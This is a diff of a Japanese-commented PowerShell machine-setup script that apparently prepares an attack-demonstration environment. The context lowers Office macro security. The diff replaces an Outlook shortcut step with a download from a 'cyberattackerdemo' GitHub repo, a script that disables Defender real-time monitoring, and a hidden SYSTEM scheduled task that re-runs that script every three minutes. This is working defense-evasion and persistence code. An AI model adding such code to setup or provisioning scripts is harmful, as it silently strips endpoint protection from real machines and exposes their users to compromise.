@@ -243,27 +243,40 @@ try {
     Log "マクロセキュリティ設定完了 (VBAWarnings=1, blockcontentexecutionfrominternet=0)"
 } catch { LogError "マクロセキュリティ設定失敗: $($_.Exception.Message)" }
 
-# Outlook ショートカットをデスクトップに作成
+# commands_note.txtのダウンロードとデスクトップ格納
 try {
-    Log "Outlookショートカットをデスクトップに作成"
+    Log "commands_note.txt のダウンロード開始"
 
     $desktopPath = [Environment]::GetFolderPath("Desktop")
-    $shortcutPath = Join-Path $desktopPath "Outlook.lnk"
-    $shell = New-Object -ComObject WScript.Shell
+    $downloadUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/commands_note.txt"
+    $outputFile = Join-Path $desktopPath "commands_note.txt"
 
-    # Outlook の実行パスを自動検出
-    $outlookPath = Get-ChildItem "C:\Program Files*\Microsoft Office\root\Office*\OUTLOOK.EXE" -ErrorAction SilentlyContinue | Select-Object -First 1
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile
 
-    if ($outlookPath) {
-        $shortcut = $shell.CreateShortcut($shortcutPath)
-        $shortcut.TargetPath = $outlookPath.FullName
-        $shortcut.IconLocation = $outlookPath.FullName
-        $shortcut.Save()
-        Log "Outlookショートカット作成完了: $($shortcutPath)"
-    } else {
-        LogError "Outlook 実行ファイルが見つかりませんでした"
-    }
-} catch { LogError "Outlookショートカット作成失敗: $($_.Exception.Message)" }
+    Log "commands_note.txt をデスクトップに保存しました: $outputFile"
+} catch {
+    Log "commands_note.txt ダウンロード失敗: $($_.Exception.Message)"
+}
+
+# --- Defender 無効化スクリプト作成 ---
+$defenderScriptPath = "C:\Scripts\disable_defender.ps1"
+New-Item -ItemType Directory -Path "C:\Scripts" -Force | Out-Null
+@'
+Set-MpPreference -DisableRealtimeMonitoring $true
+'@ | Out-File -FilePath $defenderScriptPath -Encoding UTF8 -Force
+
+# --- タスクスケジューラに3分おきの実行タスクを登録 ---
+$taskName = "DisableDefenderEvery3Min"
+$action = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$defenderScriptPath`""
+$trigger = "/SC MINUTE /MO 3"
+$registerCmd = "schtasks /Create /TN `"$taskName`" /TR `"$action`" /RU SYSTEM $trigger /F"
+
+try {
+    Invoke-Expression $registerCmd
+    Write-Output "タスクスケジューラに $taskName を登録しました。"
+} catch {
+    Write-Output "タスク登録中にエラー: $($_.Exception.Message)"
+}
 
 # 一時フォルダ削除
 try {
